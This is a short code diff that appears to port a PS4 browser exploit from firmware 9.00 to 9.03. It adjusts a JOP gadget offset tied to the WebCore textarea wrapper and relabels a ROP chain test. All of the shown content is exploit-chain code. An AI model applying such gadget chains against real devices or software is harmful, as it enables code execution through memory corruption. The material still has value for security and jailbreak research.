@@ -81,7 +81,7 @@ let libc_base = null;
 // When the scrollLeft getter native function is called on PS4 9.00, rsi is the
 // JS wrapper for the WebCore textarea class.
 const jop1 = `
-mov rdi, qword ptr [rsi + 0x20]
+mov rdi, qword ptr [rsi + 0x18]
 mov rax, qword ptr [rdi]
 call qword ptr [rax + 0xb8]
 `;
@@ -689,5 +689,5 @@ function test_rop(Chain) {
     }
 }
 
-debug_log('Chain900');
+debug_log('Chain903');
 test_rop(Chain);
